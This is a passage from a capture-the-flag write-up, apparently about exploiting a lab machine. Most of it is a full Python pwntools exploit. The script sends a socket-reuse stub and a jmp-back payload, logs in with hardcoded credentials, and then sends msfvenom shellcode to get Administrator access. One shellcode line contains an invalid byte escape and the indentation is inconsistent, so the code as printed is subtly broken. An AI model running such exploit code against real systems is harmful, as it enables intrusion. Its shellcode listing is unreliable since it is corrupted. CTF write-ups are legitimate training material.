recv += b"\xa1\xac\x82\x90\x71"			# -> mov eax, [0x719082ac]
recv += b"\xff\xd0"				# -> call eax

payload = recv + b"\x90"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```

Now I simply create my *shellcode* with `msfvenom`.

![image](https://camo.githubusercontent.com/3bc13d9861696a4ed9d61b9acfb22ea4d97183eb5f149ba2111de6925d7d8396/68747470733a2f2f696d6775722e636f6d2f4259316434656c2e706e67)
 
I put it in the *exploit* and it was intact.

```python
#!/usr/bin/python3

from pwn import *
from sys import argv
from time import sleep

class Exploit():

	def __init__(self, user, password, name):
		self.__user = user
		self.__password = password
		self.__name = name

	def socket_reuse(self):
	
		"""
		int recv(
  			[in]  SOCKET s, 0x
  			[out] char   *buf, -> 0x00be40f0
  			[in]  int    len, ->  0x00000410 
  			[in]  int    flags -> 0x00000000
		);
		"""
		# Switch to your shellcode
		buf =  b""
    		buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x0c\x84\x35\xbe\x5a\x33"
    		buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x4e\x97\xd7"
    		buf += b"\x4b\xb2\x7f\x95\xb4\x4a\x80\xfa\x3d\xaf\xb1\x3a\x59"
    		buf += b"\xa4\xe2\x8a\x29\xe8\x0e\x60\x7f\x18\x84\x04\xa8\x2f"
    		buf += b"\x2d\xa2\x8e\x1e\xae\x9f\xf3\x01\x2c\xe2\x27\xe1\x0d"
    		buf += b"\x2d\x3a\xe0\x4a\x50\xb7\xb0\x03\x1e\x6a\x24\x27\x6a"
    		buf += b"\xb7\xcf\x7b\x7a\xbf\x2c\xcb\x7d\x3\x47\x24\x30"
    		buf += b"\x02\x8b\x5c\x79\x1c\xc8\x59\x33\x97\x3a\x15\xc2\x71"
    		buf += b"\x73\xd6\x69\xbc\xbb\x25\x73\xf9\x7c\xd6\x06\xf3\x7e"
    		buf += b"\x6b\x11\xc0\xfd\xb7\x94\xd2\xa6\x3c\x0e\x3e\x56\x90"
    		buf += b"\xc9\xb5\x54\x5d\x9d\x91\x78\x60\x72\xaa\x85\xe9\x75"
    		buf += b"\x7c\x0c\xa9\x51\x58\x54\x69\xfb\xf9\x30\xdc\x04\x19"
    		buf += b"\x9b\x81\xa0\x52\x36\xd5\xd8\x39\x5f\x1a\xd1\xc1\x9f"
    		buf += b"\x34\x62\xb2\xad\x9b\xd8\x5c\x9e\x54\xc7\x9b\xe1\x4e"
    		buf += b"\xbf\x33\x1c\x71\xc0\x1a\xdb\x25\x90\x34\xca\x45\x7b"
    		buf += b"\xc4\xf3\x93\x2c\x94\x5b\x4c\x8d\x44\x1c\x3c\x65\x8e"
    		buf += b"\x93\x63\x95\xb1\x79\x0c\x3c\x48\xea\x39\xcb\x42\xdf"
    		buf += b"\x55\xc9\x62\x1e\x1d\x44\x84\x4a\x71\x01\x1f\xe3\xe8"
   		buf += b"\x08\xeb\x92\xf5\x86\x96\x95\x7e\x25\x67\x5b\x77\x40"
    		buf += b"\x7b\x0c\x77\x1f\x21\x9b\x88\xb5\x4d\x47\x1a\x52\x8d"
    		buf += b"\x0e\x07\xcd\xda\x47\xf9\x04\x8e\x75\xa0\xbe\xac\x87"
    		buf += b"\x34\xf8\x74\x5c\x85\x07\x75\x11\xb1\x23\x65\xef\x3a"
    		buf += b"\x68\xd1\xbf\x6c\x26\x8f\x79\xc7\x88\x79\xd0\xb4\x42"
  		buf += b"\xed\xa5\xf6\x54\x6b\xaa\xd2\x22\x93\x1b\x8b\x72\xac"
   		buf += b"\x94\x5b\x73\xd5\xc8\xfb\x7c\x0c\x49\x1b\x9f\x84\xa4"
    		buf += b"\xb4\x06\x4d\x05\xd9\xb8\xb8\x4a\xe4\x3a\x48\x33\x13"
    		buf += b"\x22\x39\x36\x5f\xe4\xd2\x4a\xf0\x81\xd4\xf9\xf1\x83"

		recv = b""
		recv += b"\x54" 				# -> push esp
		recv += b"\x58" 				# -> pop eax
		recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
		recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
		recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
		recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
		recv += b"\x31\xdb" 				# -> xor ebx, ebx
		recv += b"\x53" 				# -> push ebx 
		recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
		recv += b"\x53" 				# -> push ebx
		recv += b"\x54"					# -> push esp
		recv += b"\x5b"					# -> pop ebx
		recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
		recv += b"\x53"					# -> push ebx
		recv += b"\x56" 				# -> push esi
		recv += b"\xa1\xac\x82\x90\x71"			# -> mov eax, [0x719082ac]
		recv += b"\xff\xd0"				# -> call eax
    
		payload = recv + b"\x90"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70

		r = remote("10.10.11.115", argv[1])

		r.sendlineafter(b"Username: ",self.__user)
		r.sendlineafter(b"Password: ",self.__password)
		r.sendlineafter(b"FullName:",self.__name)	
		r.sendlineafter(b"Input Your Code:",payload)
		sleep(1)
		r.sendline(buf)

autopwn = Exploit(b'alfiansyah', b'K3r4j@@nM4j@pAh!T', 'Vickry Alfiansyah')

def main():
	autopwn.socket_reuse()

if __name__ == '__main__':
	main()
```
 
Simply run it and gain access as Administrator
 
![image](https://camo.githubusercontent.com/e7373458ff66365c24a17f8bf2f8f770351051d433d22b9e3def4456b75bdfc7/68747470733a2f2f696d6775722e636f6d2f32774b766a7a752e706e67)
  
And I could already visualize the *flag*.

![tasca](https://user-images.githubusercontent.com/69093629/158272049-9f228e09-6f6a-478b-83b9-e4cea50e9add.jpg)
